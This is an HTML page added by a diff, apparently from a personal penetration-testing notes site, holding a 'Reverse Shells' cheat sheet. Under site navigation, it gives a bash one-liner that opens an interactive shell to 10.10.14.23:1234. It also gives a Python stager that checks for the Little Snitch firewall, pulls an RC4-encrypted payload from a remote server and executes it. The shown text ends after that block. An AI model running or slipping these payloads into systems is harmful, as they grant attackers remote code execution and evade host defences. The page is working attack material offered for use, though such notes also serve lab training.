@@ -1,0 +1,549 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../genindex.html" /><link rel="search" title="Search" href="../../search.html" /><link rel="next" title="Steganography" href="../stego/stego.html" /><link rel="prev" title="Server Hardening" href="../server-hardening/server-hardening.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Reverse Shells - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../htb/htb.html">Hack The Box</a><input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/machines/machines.html">Lab Machines</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../other.html">Other</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2 current current-page"><a class="current reference internal" href="#">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="reverse-shells">
+<h1>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this heading">#</a></h1>
+<section id="bash">
+<h2>Bash<a class="headerlink" href="#bash" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.23/1234<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</pre></div>
+</div>
+</section>
+<section id="python">
+<h2>python<a class="headerlink" href="#python" title="Permalink to this heading">#</a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span> 
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;ps -ef | grep Little\ Snitch | grep -v grep&quot;</span>
+<span class="n">ps</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">=</span> <span class="n">ps</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">ps</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;Little Snitch&quot;</span><span class="p">,</span> <span class="n">out</span><span class="p">):</span>
+   <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="kn">import</span> <span class="nn">urllib2</span><span class="p">;</span>
+
+<span class="n">UA</span><span class="o">=</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span><span class="p">;</span>
+<span class="n">server</span><span class="o">=</span><span class="s1">&#39;http://192.168.100.15:80&#39;</span><span class="p">;</span>
+<span class="n">t</span><span class="o">=</span><span class="s1">&#39;/admin/get.php&#39;</span><span class="p">;</span>
+<span class="n">req</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">server</span><span class="o">+</span><span class="n">t</span><span class="p">);</span>
+<span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">,</span><span class="n">UA</span><span class="p">);</span>
+<span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s1">&#39;Cookie&#39;</span><span class="p">,</span><span class="s2">&quot;session=hdN8lA2yDkGiD8sWWYXJTtm+J14=&quot;</span><span class="p">);</span>
+<span class="n">proxy</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">ProxyHandler</span><span class="p">();</span>
+<span class="n">o</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span>
+<span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
+<span class="n">a</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">();</span>
+<span class="n">IV</span><span class="o">=</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">];</span>
+<span class="n">data</span><span class="o">=</span><span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">:];</span>
+<span class="n">key</span><span class="o">=</span><span class="n">IV</span><span class="o">+</span><span class="s1">&#39;At&amp;(7gx@?MF!jwbSs4H~l-XLPrOCzi:E&#39;</span><span class="p">;</span>
+<span class="n">S</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">out</span><span class="o">=</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span><span class="mi">0</span><span class="p">,[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">j</span><span class="o">=</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+<span class="n">i</span><span class="o">=</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+    <span class="n">i</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">j</span><span class="o">=</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">256</span>
+    <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span><span class="o">^</span><span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span><span class="o">%</span><span class="mi">256</span><span class="p">]))</span>
+<span class="n">exec</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+</pre></div>
+</div>
